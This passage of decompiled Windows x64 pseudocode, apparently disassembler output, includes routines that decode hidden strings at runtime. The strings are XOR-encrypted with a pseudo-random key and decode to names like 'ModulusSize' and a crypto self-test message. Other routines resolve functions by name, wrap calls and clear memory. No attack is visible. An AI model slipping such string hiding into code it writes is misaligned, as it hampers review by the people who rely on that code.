// 1400DA3D7: using guessed type char byte_1400DA3D7;
// 1400DA3D8: using guessed type char byte_1400DA3D8;

//----- (0000000140027740) ----------------------------------------------------
_QWORD *__fastcall sub_140027740(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA3DC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA3DC & 1 )
  {
    v5 = byte_1400DA3D9;
  }
  else
  {
    v4 = 69069 * dword_1400DA358 + 1234567;
    v1 = dword_1400DA3DC | 1;
    dword_1400DA358 = v4;
    dword_1400DA3DC |= 1u;
    dword_1400DA350 = HIWORD(dword_1400DA350) + 36969 * (unsigned __int16)dword_1400DA350;
    LOBYTE(v4) = (BYTE2(dword_1400DA360) + 80 * dword_1400DA360) ^ v4;
    dword_1400DA360 = HIWORD(dword_1400DA360) + 18000 * (unsigned __int16)dword_1400DA360;
    v5 = (((unsigned int)dword_1400DA354 >> 13) ^ 32 * dword_1400DA354 ^ dword_1400DA354) + v4;
    dword_1400DA354 ^= ((unsigned int)dword_1400DA354 >> 13) ^ 32 * (dword_1400DA354 ^ (dword_1400DA354 << 12));
    byte_1400DA3D9 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA3DC = v1 | 2;
    byte_1400DA3E0[0] = v5 ^ 0x66;
    byte_1400DA3E1 = (v5 - 1) ^ 0x75;
    byte_1400DA3E2 = (v5 - 2) ^ 0x6E;
    byte_1400DA3E3 = (v5 - 3) ^ 0x63;
    byte_1400DA3E4 = (v5 - 4) ^ 0x74;
    byte_1400DA3E5 = (v5 - 5) ^ 0x69;
    byte_1400DA3E6 = (v5 - 6) ^ 0x6F;
    byte_1400DA3E7 = (v5 - 7) ^ 0x6E;
    byte_1400DA3E8 = (v5 - 8) ^ 0x32;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DA3D9;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA3E0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DA350: using guessed type int dword_1400DA350;
// 1400DA354: using guessed type int dword_1400DA354;
// 1400DA358: using guessed type int dword_1400DA358;
// 1400DA360: using guessed type int dword_1400DA360;
// 1400DA3D9: using guessed type char byte_1400DA3D9;
// 1400DA3DC: using guessed type int dword_1400DA3DC;
// 1400DA3E1: using guessed type char byte_1400DA3E1;
// 1400DA3E2: using guessed type char byte_1400DA3E2;
// 1400DA3E3: using guessed type char byte_1400DA3E3;
// 1400DA3E4: using guessed type char byte_1400DA3E4;
// 1400DA3E5: using guessed type char byte_1400DA3E5;
// 1400DA3E6: using guessed type char byte_1400DA3E6;
// 1400DA3E7: using guessed type char byte_1400DA3E7;
// 1400DA3E8: using guessed type char byte_1400DA3E8;

//----- (0000000140027920) ----------------------------------------------------
__int64 __fastcall sub_140027920(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 176i64))();
}

//----- (0000000140027A40) ----------------------------------------------------
signed __int64 __fastcall sub_140027A40(__int64 a1)
{
  return a1 + 64;
}

//----- (0000000140027A50) ----------------------------------------------------
__int64 sub_140027A50()
{
  char v1; // [rsp+10h] [rbp+10h]

  return sub_140028CF0(&v1);
}
// 140028CF0: using guessed type __int64 __fastcall sub_140028CF0(_QWORD);

//----- (0000000140027A60) ----------------------------------------------------
__int64 __fastcall sub_140027A60(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 48i64))();
  if ( result )
    result += *(signed int *)(*(_QWORD *)(result + 8) + 4i64) + 8i64;
  return result;
}

//----- (0000000140027A90) ----------------------------------------------------
signed __int64 __fastcall sub_140027A90(__int64 a1)
{
  return *(_QWORD *)(a1 + 80) + 24i64;
}

//----- (0000000140027AA0) ----------------------------------------------------
_QWORD *__fastcall sub_140027AA0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA390;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA390 & 1 )
  {
    v5 = byte_1400DA38F;
  }
  else
  {
    v4 = 69069 * dword_1400DA358 + 1234567;
    v1 = dword_1400DA390 | 1;
    dword_1400DA358 = v4;
    dword_1400DA390 |= 1u;
    dword_1400DA350 = HIWORD(dword_1400DA350) + 36969 * (unsigned __int16)dword_1400DA350;
    LOBYTE(v4) = (BYTE2(dword_1400DA360) + 80 * dword_1400DA360) ^ v4;
    dword_1400DA360 = HIWORD(dword_1400DA360) + 18000 * (unsigned __int16)dword_1400DA360;
    v5 = (((unsigned int)dword_1400DA354 >> 13) ^ 32 * dword_1400DA354 ^ dword_1400DA354) + v4;
    dword_1400DA354 ^= ((unsigned int)dword_1400DA354 >> 13) ^ 32 * (dword_1400DA354 ^ (dword_1400DA354 << 12));
    byte_1400DA38F = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA390 = v1 | 2;
    byte_1400DA398[0] = v5 ^ 0x4D;
    byte_1400DA399 = (v5 - 1) ^ 0x6F;
    byte_1400DA39A = (v5 - 2) ^ 0x64;
    byte_1400DA39B = (v5 - 3) ^ 0x75;
    byte_1400DA39C = (v5 - 4) ^ 0x6C;
    byte_1400DA39D = (v5 - 5) ^ 0x75;
    byte_1400DA39E = (v5 - 6) ^ 0x73;
    byte_1400DA39F = (v5 - 7) ^ 0x53;
    byte_1400DA3A0 = (v5 - 8) ^ 0x69;
    byte_1400DA3A1 = (v5 - 9) ^ 0x7A;
    byte_1400DA3A2 = (v5 - 10) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xBui64 )
  {
    sub_140004790(Src, 0xBui64, 0i64);
    v5 = byte_1400DA38F;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_WORD *)v6 + 4) = 0;
  *((_BYTE *)v6 + 10) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 11i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 11) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA398[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xB );
  return v3;
}
// 1400DA350: using guessed type int dword_1400DA350;
// 1400DA354: using guessed type int dword_1400DA354;
// 1400DA358: using guessed type int dword_1400DA358;
// 1400DA360: using guessed type int dword_1400DA360;
// 1400DA38F: using guessed type char byte_1400DA38F;
// 1400DA390: using guessed type int dword_1400DA390;
// 1400DA399: using guessed type char byte_1400DA399;
// 1400DA39A: using guessed type char byte_1400DA39A;
// 1400DA39B: using guessed type char byte_1400DA39B;
// 1400DA39C: using guessed type char byte_1400DA39C;
// 1400DA39D: using guessed type char byte_1400DA39D;
// 1400DA39E: using guessed type char byte_1400DA39E;
// 1400DA39F: using guessed type char byte_1400DA39F;
// 1400DA3A0: using guessed type char byte_1400DA3A0;
// 1400DA3A1: using guessed type char byte_1400DA3A1;
// 1400DA3A2: using guessed type char byte_1400DA3A2;

//----- (0000000140027CA0) ----------------------------------------------------
__int64 __fastcall sub_140027CA0(__int64 a1)
{
  __int64 v1; // rcx
  __int64 result; // rax

  v1 = *(_QWORD *)(a1 + 8);
  if ( v1 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v1 + 16i64))();
  else
    result = 0i64;
  return result;
}

//----- (0000000140027CC0) ----------------------------------------------------
__int64 __fastcall sub_140027CC0(__int64 a1)
{
  __int64 v1; // rsi
  _QWORD *v2; // rax
  __int64 v3; // rdi
  _QWORD *v4; // rbx
  __int64 v5; // rax

  v1 = a1;
  v2 = (_QWORD *)(*(__int64 (**)(void))(*(_QWORD *)a1 + 48i64))();
  v3 = *v2;
  v4 = v2;
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 40i64))(v1);
  return (*(__int64 (__fastcall **)(_QWORD *, __int64))(v3 + 16))(v4, v5);
}

//----- (0000000140027D10) ----------------------------------------------------
_QWORD *__fastcall sub_140027D10(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA3A4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA3A4 & 1 )
  {
    v5 = byte_1400DA3A3;
  }
  else
  {
    v4 = 69069 * dword_1400DA358 + 1234567;
    v1 = dword_1400DA3A4 | 1;
    dword_1400DA358 = v4;
    dword_1400DA3A4 |= 1u;
    dword_1400DA350 = HIWORD(dword_1400DA350) + 36969 * (unsigned __int16)dword_1400DA350;
    LOBYTE(v4) = (BYTE2(dword_1400DA360) + 80 * dword_1400DA360) ^ v4;
    dword_1400DA360 = HIWORD(dword_1400DA360) + 18000 * (unsigned __int16)dword_1400DA360;
    v5 = (((unsigned int)dword_1400DA354 >> 13) ^ 32 * dword_1400DA354 ^ dword_1400DA354) + v4;
    dword_1400DA354 ^= ((unsigned int)dword_1400DA354 >> 13) ^ 32 * (dword_1400DA354 ^ (dword_1400DA354 << 12));
    byte_1400DA3A3 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA3A4 = v1 | 2;
    byte_1400DA3A8[0] = v5 ^ 0x22;
    byte_1400DA3A9 = (v5 - 1) ^ 0x3A;
    byte_1400DA3AA = (v5 - 2) ^ 0x20;
    byte_1400DA3AB = (v5 - 3) ^ 0x70;
    byte_1400DA3AC = (v5 - 4) ^ 0x61;
    byte_1400DA3AD = (v5 - 5) ^ 0x69;
    byte_1400DA3AE = (v5 - 6) ^ 0x72;
    byte_1400DA3AF = (v5 - 7) ^ 0x77;
    byte_1400DA3B0 = (v5 - 8) ^ 0x69;
    byte_1400DA3B1 = (v5 - 9) ^ 0x73;
    byte_1400DA3B2 = (v5 - 10) ^ 0x65;
    byte_1400DA3B3 = (v5 - 11) ^ 0x20;
    byte_1400DA3B4 = (v5 - 12) ^ 0x63;
    byte_1400DA3B5 = (v5 - 13) ^ 0x6F;
    byte_1400DA3B6 = (v5 - 14) ^ 0x6E;
    byte_1400DA3B7 = (v5 - 15) ^ 0x73;
    byte_1400DA3B8 = (v5 - 16) ^ 0x69;
    byte_1400DA3B9 = (v5 - 17) ^ 0x73;
    byte_1400DA3BA = (v5 - 18) ^ 0x74;
    byte_1400DA3BB = (v5 - 19) ^ 0x65;
    byte_1400DA3BC = (v5 - 20) ^ 0x6E;
    byte_1400DA3BD = (v5 - 21) ^ 0x63;
    byte_1400DA3BE = (v5 - 22) ^ 0x79;
    byte_1400DA3BF = (v5 - 23) ^ 0x20;
    byte_1400DA3C0 = (v5 - 24) ^ 0x74;
    byte_1400DA3C1 = (v5 - 25) ^ 0x65;
    byte_1400DA3C2 = (v5 - 26) ^ 0x73;
    byte_1400DA3C3 = (v5 - 27) ^ 0x74;
    byte_1400DA3C4 = (v5 - 28) ^ 0x20;
    byte_1400DA3C5 = (v5 - 29) ^ 0x66;
    byte_1400DA3C6 = (v5 - 30) ^ 0x61;
    byte_1400DA3C7 = (v5 - 31) ^ 0x69;
    byte_1400DA3C8 = (v5 - 32) ^ 0x6C;
    byte_1400DA3C9 = (v5 - 33) ^ 0x65;
    byte_1400DA3CA = (v5 - 34) ^ 0x64;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x23ui64 )
  {
    sub_140004790(Src, 0x23ui64, 0i64);
    v5 = byte_1400DA3A3;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  *((_WORD *)v6 + 16) = 0;
  *((_BYTE *)v6 + 34) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 35i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 35) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA3A8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x23 );
  return v3;
}
// 1400DA350: using guessed type int dword_1400DA350;
// 1400DA354: using guessed type int dword_1400DA354;
// 1400DA358: using guessed type int dword_1400DA358;
// 1400DA360: using guessed type int dword_1400DA360;
// 1400DA3A3: using guessed type char byte_1400DA3A3;
// 1400DA3A4: using guessed type int dword_1400DA3A4;
// 1400DA3A9: using guessed type char byte_1400DA3A9;
// 1400DA3AA: using guessed type char byte_1400DA3AA;
// 1400DA3AB: using guessed type char byte_1400DA3AB;
// 1400DA3AC: using guessed type char byte_1400DA3AC;
// 1400DA3AD: using guessed type char byte_1400DA3AD;
// 1400DA3AE: using guessed type char byte_1400DA3AE;
// 1400DA3AF: using guessed type char byte_1400DA3AF;
// 1400DA3B0: using guessed type char byte_1400DA3B0;
// 1400DA3B1: using guessed type char byte_1400DA3B1;
// 1400DA3B2: using guessed type char byte_1400DA3B2;
// 1400DA3B3: using guessed type char byte_1400DA3B3;
// 1400DA3B4: using guessed type char byte_1400DA3B4;
// 1400DA3B5: using guessed type char byte_1400DA3B5;
// 1400DA3B6: using guessed type char byte_1400DA3B6;
// 1400DA3B7: using guessed type char byte_1400DA3B7;
// 1400DA3B8: using guessed type char byte_1400DA3B8;
// 1400DA3B9: using guessed type char byte_1400DA3B9;
// 1400DA3BA: using guessed type char byte_1400DA3BA;
// 1400DA3BB: using guessed type char byte_1400DA3BB;
// 1400DA3BC: using guessed type char byte_1400DA3BC;
// 1400DA3BD: using guessed type char byte_1400DA3BD;
// 1400DA3BE: using guessed type char byte_1400DA3BE;
// 1400DA3BF: using guessed type char byte_1400DA3BF;
// 1400DA3C0: using guessed type char byte_1400DA3C0;
// 1400DA3C1: using guessed type char byte_1400DA3C1;
// 1400DA3C2: using guessed type char byte_1400DA3C2;
// 1400DA3C3: using guessed type char byte_1400DA3C3;
// 1400DA3C4: using guessed type char byte_1400DA3C4;
// 1400DA3C5: using guessed type char byte_1400DA3C5;
// 1400DA3C6: using guessed type char byte_1400DA3C6;
// 1400DA3C7: using guessed type char byte_1400DA3C7;
// 1400DA3C8: using guessed type char byte_1400DA3C8;
// 1400DA3C9: using guessed type char byte_1400DA3C9;
// 1400DA3CA: using guessed type char byte_1400DA3CA;

//----- (000000014002803C) ----------------------------------------------------
char __fastcall sub_14002803C(__int64 a1, const char *a2, __int64 a3, _QWORD *a4)
{
  return sub_140055E50(a1 - *(signed int *)(a1 - 4) - 136, a2, a3, a4);
}

//----- (0000000140028050) ----------------------------------------------------
__int64 __fastcall sub_140028050(__int64 a1, const char *a2, __int64 a3, _QWORD *a4)
{
  return sub_140028060(a1 - *(signed int *)(a1 - 4), a2, a3, a4);
}

//----- (0000000140028060) ----------------------------------------------------
__int64 __fastcall sub_140028060(__int64 a1, const char *a2, __int64 a3, _QWORD *a4)
{
  char v5; // [rsp+30h] [rbp-38h]

  sub_140023050((__int64)&v5, a1 - 216, a2, a3, a4, 0i64);
  return *(unsigned __int8 *)(sub_140025330((__int64)&v5) + 32);
}

//----- (00000001400280B0) ----------------------------------------------------
__int64 __fastcall sub_1400280B0(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 112i64))();
}

//----- (00000001400280C0) ----------------------------------------------------
__int64 __fastcall sub_1400280C0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // rcx
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( *(_QWORD *)(a1 + 8) )
  {
    (*(void (__fastcall **)(__int64, signed __int64, signed __int64, signed __int64))(*(_QWORD *)(a1 + 144) + 8i64))(
      a1 + 144,
      1i64,
      50i64,
      300i64);
    v4 = *(_QWORD *)(v3 + 8);
    *(_QWORD *)(v3 + 16) = v2;
    result = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v4 + 24i64))(v4, v2);
  }
  return result;
}

//----- (00000001400281C0) ----------------------------------------------------
bool __fastcall sub_1400281C0(_QWORD *a1, __int64 *a2)
{
  _QWORD *v2; // rdi
  _QWORD *v3; // rbp
  void **v4; // rbx
  char v6; // [rsp+20h] [rbp-68h]
  void *v7; // [rsp+28h] [rbp-60h]
  __int64 v8; // [rsp+40h] [rbp-48h]
  void *v9; // [rsp+48h] [rbp-40h]
  unsigned __int64 v10; // [rsp+60h] [rbp-28h]

  v8 = -2i64;
  v2 = a1;
  if ( a1[8] )
  {
    sub_140011A50(a1 + 9, a2);
    sub_14002BC40(&v6, (__int64)v2);
    v3 = (_QWORD *)(*(__int64 (__fastcall **)(_QWORD *, void **, _QWORD, char *))(v2[11] + 8i64))(
                     v2 + 11,
                     &v9,
                     0i64,
                     &v6);
    v4 = (void **)(v2 + 12);
    if ( v2 + 12 != v3 )
    {
      if ( v2[15] >= 0x10ui64 )
        operator delete(*v4);
      v2[15] = 15i64;
      v2[14] = 0i64;
      *(_BYTE *)v4 = 0;
      sub_140004720(v2 + 12, v3);
    }
    if ( v10 >= 0x10 )
      operator delete(v9);
    sub_1400298B0((void ***)&v7);
    operator delete(v7);
  }
  return v2[14] != 0i64;
}

//----- (00000001400282B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400282B0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  __int64 v5; // [rsp+28h] [rbp-D0h]
  signed int *v6; // [rsp+30h] [rbp-C8h]
  void *v7; // [rsp+40h] [rbp-B8h]
  __int64 (__fastcall **v8)(void *); // [rsp+48h] [rbp-B0h]
  char v9; // [rsp+50h] [rbp-A8h]
  __int64 v10; // [rsp+A8h] [rbp-50h]
  int v11; // [rsp+B0h] [rbp-48h]
  void *v12; // [rsp+C0h] [rbp-38h]

  v5 = -2i64;
  v2 = a2;
  v3 = a1;
  v6 = (signed int *)&unk_1400A6BB0;
  v7 = &unk_1400A6BB8;
  v12 = std::basic_ios<char,std::char_traits<char>>::`vftable';
  std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(&v6, &v8, 0i64);
  *(signed int **)((char *)&v6 + v6[1]) = (signed int *)&off_1400A6BA8;
  *(_DWORD *)((char *)&v5 + v6[1] + 4) = v6[1] - 152;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(&v8);
  v8 = &off_1400A6430;
  v10 = 0i64;
  v11 = 0;
  sub_14003CA80(&v7, v2);
  sub_14002A070((__int64)&v6, v3);
  *(signed int **)((char *)&v6 + v6[1]) = (signed int *)&off_1400A6BA8;
  *(_DWORD *)((char *)&v5 + v6[1] + 4) = v6[1] - 152;
  sub_140023CD0((__int64)&v8);
  std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(&v9);
  v12 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v12);
  return v3;
}
// 14003CA80: using guessed type __int64 __fastcall sub_14003CA80(_QWORD, _QWORD);
// 1400A15C8: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(_QWORD);
// 1400A15D0: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);
// 1400A6BA8: using guessed type __int64 (__fastcall *off_1400A6BA8)();

//----- (0000000140028400) ----------------------------------------------------
__int64 __fastcall sub_140028400(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 128i64))();
}

//----- (0000000140028410) ----------------------------------------------------
bool __fastcall sub_140028410(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax

  v2 = a2;
  v3 = sub_140049E30();
  return (unsigned int)sub_140045A60(v2, v3) == 0;
}

//----- (0000000140028440) ----------------------------------------------------
bool __fastcall sub_140028440(__int64 a1)
{
  return *(_QWORD *)(a1 + 96) != *(_QWORD *)(a1 + 104);
}

//----- (0000000140028450) ----------------------------------------------------
char sub_140028450()
{
  return 1;
}

//----- (0000000140028460) ----------------------------------------------------
__int64 sub_140028460()
{
  __int64 v0; // rax
  unsigned __int8 v1; // bl
  void *v2; // rdx
  char v4; // [rsp+28h] [rbp-30h]
  __int64 v5; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v0 = sub_1400471E0(&v4);
  v1 = sub_140048E40(v0);
  v2 = Memory;
  memset(Memory, 0, 8 * v5);
  free(v2);
  return v1;
}
// 1400471E0: using guessed type __int64 __cdecl sub_1400471E0(_QWORD);

//----- (00000001400284C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400284C0(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  __int64 (__fastcall *v4)(void **, __int64, __int64); // rax
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  void *v8; // [rsp+28h] [rbp-30h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v4 = *(__int64 (__fastcall **)(void **, __int64, __int64))(a1 + 64);
  v5 = a2;
  if ( v4 )
  {
    v6 = (_QWORD *)v4(&v8, a3, a4);
    sub_140003CB0(v5, v6);
    if ( v9 >= 0x10 )
      operator delete(v8);
  }
  else
  {
    a2[2] = 0i64;
    a2[3] = 15i64;
    *(_BYTE *)a2 = 0;
    sub_140004F20(a2, byte_1400A3400, 0i64);
  }
  return v5;
}

//----- (0000000140028550) ----------------------------------------------------
__int64 __fastcall sub_140028550(__int64 a1)
{
  signed __int64 v1; // rcx

  v1 = a1 - *(signed int *)(a1 - 4) - 176;
  return (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(v1 - 40) + 8i64))(v1 - 40);
}

//----- (0000000140028580) ----------------------------------------------------
bool __fastcall sub_140028580(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  _QWORD *v4; // rax
  __int64 (__cdecl *v5)(__int64, __int64); // rsi
  __int64 v6; // r14
  _QWORD *v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rcx
  void *Src; // [rsp+30h] [rbp-58h]
  __int64 v12; // [rsp+40h] [rbp-48h]
  unsigned __int64 v13; // [rsp+48h] [rbp-40h]
  void *v14; // [rsp+50h] [rbp-38h]
  unsigned __int64 v15; // [rsp+68h] [rbp-20h]

  v2 = (_QWORD *)a1;
  if ( !(*(unsigned __int8 (__cdecl **)(_QWORD, __int64))(**(_QWORD **)(a1 + 24) + 32i64))(*(_QWORD *)(a1 + 24), a2)
    && (*(unsigned __int8 (__fastcall **)(_QWORD, _QWORD *))(*(_QWORD *)v2[3] + 8i64))(v2[3], v2 + 4) )
  {
    v3 = v2[3];
    v4 = sub_140027560(&Src);
    v5 = (__int64 (__cdecl *)(__int64, __int64))(*(__int64 (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v3 + 24i64))(
                                                  v3,
                                                  v4);
    if ( v13 >= 0x10 )
      operator delete(Src);
    v13 = 15i64;
    v12 = 0i64;
    LOBYTE(Src) = 0;
    v6 = v2[3];
    v7 = sub_140027740(&v14);
    v2[8] = (*(__int64 (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v6 + 24i64))(v6, v7);
    if ( v15 >= 0x10 )
      operator delete(v14);
    if ( v5 )
      v2[1] = v5(v9, v8);
  }
  return v2[1] != 0i64;
}

//----- (0000000140028698) ----------------------------------------------------
__int64 __fastcall sub_140028698(__int64 a1, __int64 a2)
{
  return sub_1400286B0(a1 - *(signed int *)(a1 - 4) - 176, a2);
}

//----- (00000001400286B0) ----------------------------------------------------
__int64 __fastcall sub_1400286B0(__int64 a1, __int64 a2)
{
  __int64 v2; // r14
  __int64 v3; // rbp
  _QWORD *v4; // rax
  __int64 v5; // rsi
  _QWORD *v6; // rdi
  __int64 v7; // rax
  __int64 result; // rax

  v2 = a1;
  v3 = a2;
  v4 = (_QWORD *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 32) + 56i64))(a1 - 32);
  v5 = *v4;
  v6 = v4;
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v2 - 32) + 40i64))(v2 - 32);
  result = (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64))(v5 + 32))(v6, v7, v3);
  *(_DWORD *)(v2 - 16) = 0;
  return result;
}

//----- (0000000140028720) ----------------------------------------------------
__int64 __fastcall sub_140028720(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *(_QWORD *)v2 = &off_1400A6710;
    result = *(unsigned int *)(v3 + 32);
    *(_DWORD *)(v2 + 32) = result;
  }
  return result;
}
// 1400A6710: using guessed type __int64 (__fastcall *off_1400A6710)(void *);

//----- (0000000140028770) ----------------------------------------------------
signed __int64 __fastcall sub_140028770(__int64 a1)
{
  return a1 + 8;
}

//----- (0000000140028790) ----------------------------------------------------
__int64 __fastcall sub_140028790(__int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  void *v6; // rdx
  char v8; // [rsp+28h] [rbp-60h]
  __int64 v9; // [rsp+38h] [rbp-50h]
  void *Memory; // [rsp+40h] [rbp-48h]
  char v11; // [rsp+50h] [rbp-38h]
  __int64 v12; // [rsp+60h] [rbp-28h]
  void *v13; // [rsp+68h] [rbp-20h]

  v1 = a1;
  v2 = sub_14004A6C0(&v11, *(_QWORD *)(a1 + 40) << 6);
  v3 = sub_1400247D0((__int64)&v8, v2);
  v4 = sub_14003C670(v1 + 104, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v9);
  free(v5);
  v6 = v13;
  memset(v13, 0, 8 * v12);
  free(v6);
  return v4;
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);

//----- (0000000140028830) ----------------------------------------------------
__int64 __fastcall sub_140028830(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_140048790(a2, (__int64)&v7, a1 + 24);
  v4 = sub_14003C670(v2 + 104, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (00000001400288A0) ----------------------------------------------------
__int64 __fastcall sub_1400288A0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rbx
  void *v6; // rdx
  void *v7; // rdx
  char v9; // [rsp+28h] [rbp-60h]
  __int64 v10; // [rsp+38h] [rbp-50h]
  void *Memory; // [rsp+40h] [rbp-48h]
  char v12; // [rsp+50h] [rbp-38h]
  __int64 v13; // [rsp+60h] [rbp-28h]
  void *v14; // [rsp+68h] [rbp-20h]

  v2 = a1;
  v3 = sub_1400246E0((__int64)&v12, a2);
  v4 = sub_1400247D0((__int64)&v9, v3);
  v5 = sub_14003C670(v2 + 104, v4);
  v6 = Memory;
  memset(Memory, 0, 8 * v10);
  free(v6);
  v7 = v14;
  memset(v14, 0, 8 * v13);
  free(v7);
  return v5;
}

//----- (0000000140028934) ----------------------------------------------------
__int64 __fastcall sub_140028934(__int64 a1, unsigned int a2)
{
